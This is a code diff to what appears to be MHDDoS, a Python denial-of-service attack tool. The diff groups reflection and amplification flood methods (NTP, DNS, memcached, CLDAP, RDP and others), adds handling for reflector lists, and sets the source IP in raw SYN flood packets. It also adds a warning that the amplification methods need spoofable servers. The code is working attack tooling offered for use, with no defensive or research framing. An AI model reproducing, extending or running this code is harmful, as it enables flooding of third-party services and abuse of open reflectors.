@@ -34,6 +34,8 @@ from impacket.ImpactPacket import IP, TCP, UDP, Data
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
+from re import compile
+
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -53,20 +55,19 @@ def getMyIPAddress():
     if __ip__:
         return __ip__
     with suppress(Exception):
-        __ip__ = get('https://api.my-ip.io/ip', timeout=.1).text
+        return get('https://api.my-ip.io/ip', timeout=.1).text
     with suppress(Exception):
-        __ip__ = get('https://ipwhois.app/json/', timeout=.1).json()["ip"]
+        return get('https://ipwhois.app/json/', timeout=.1).json()["ip"]
     with suppress(Exception):
-        __ip__ = get('https://ipinfo.io/json', timeout=.1).json()["ip"]
+        return get('https://ipinfo.io/json', timeout=.1).json()["ip"]
     with suppress(Exception):
-        __ip__ = ProxyTools.Patterns.IP.search(get('http://checkip.dyndns.org/', timeout=.1).text)
+        return ProxyTools.Patterns.IP.search(get('http://checkip.dyndns.org/', timeout=.1).text)
     with suppress(Exception):
-        __ip__ = ProxyTools.Patterns.IP.search(get('https://spaceiran.com/myip/', timeout=.1).text)
+        return ProxyTools.Patterns.IP.search(get('https://spaceiran.com/myip/', timeout=.1).text)
     with suppress(Exception):
-        __ip__ = get('https://ip.42.pl/raw', timeout=.1).text
+        return get('https://ip.42.pl/raw', timeout=.1).text
     return getMyIPAddress()
 
-  
   
 class bcolors:
     HEADER = '\033[95m'
@@ -95,11 +96,18 @@ class Methods:
         "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER"
     }
 
-    LAYER4_METHODS: Set[str] = {
-        "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM", "NTP", "DNS", "ARD",
-        "CHAR", "RDP", "MCBOT", "CONNECTION", "CPS", "FIVEM", "TS3", "MCPE",
-        "CLDAP"
+
+    LAYER4_AMP: Set[str] = {
+        "MEM", "NTP", "DNS", "ARD",
+        "CLDAP", "CHAR", "RDP"
     }
+
+
+    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
+        "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
+        "MCBOT", "CONNECTION", "CPS", "FIVEM", "TS3", "MCPE"
+    }
+
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
 
 
@@ -134,6 +142,7 @@ BYTES_SEND = Counter()
 
 
 class Tools:
+    IP = compile("(?:\d{1,3}\.){3}\d{1,3}")
 
     @staticmethod
     def humanbytes(i: int, binary: bool = False, precision: int = 2):
@@ -527,7 +536,7 @@ class Layer4(Thread):
 
     def _genrate_syn(self) -> bytes:
         ip: IP = IP()
-        ip.set_ip_src(getMyIPAddress())
+        ip.set_ip_src(__ip__)
         ip.set_ip_dst(self._target[0])
         tcp: TCP = TCP()
         tcp.set_SYN()
@@ -1415,6 +1424,7 @@ if __name__ == '__main__':
                 if method not in Methods.ALL_METHODS:
                     exit("Method Not Found %s" %
                          ", ".join(Methods.ALL_METHODS))
+                
 
                 if method in Methods.LAYER7_METHODS:
                     url = URL(urlraw)
@@ -1487,14 +1497,22 @@ if __name__ == '__main__':
                     if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN"} and \
                             not ToolsConsole.checkRawSocket():
                         exit("Cannot Create Raw Socket")
+                
+                    if method in Methods.LAYER4_AMP:
+                        logger.warning("this method need spoofable servers please check")
+                        logger.warning("https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack")
 
                     threads = int(argv[3])
                     timer = int(argv[4])
                     proxies = None
                     ref = None
+
                     if not port:
                         logger.warning("Port Not Selected, Set To Default: 80")
                         port = 80
+                    
+                    if method == "SYN":
+                        __ip__ = getMyIPAddress()
 
                     if len(argv) >= 6:
                         argfive = argv[5].strip()
@@ -1506,8 +1524,7 @@ if __name__ == '__main__':
                                 if len(argv) == 7:
                                     logger.setLevel("DEBUG")
                                 ref = set(a.strip()
-                                          for a in ProxyTools.Patterns.IP.findall(
-                                    refl_li.open("r+").read()))
+                                          for a in Tools.IP.findall(refl_li.open("r").read()))
                                 if not ref: exit("Empty Reflector File ")
 
                             elif argfive.isdigit() and len(argv) >= 7:
@@ -1521,7 +1538,6 @@ if __name__ == '__main__':
 
                             else:
                                 logger.setLevel("DEBUG")
-
                     for _ in range(threads):
                         Layer4((target, port), ref, method, event,
                                proxies).start()
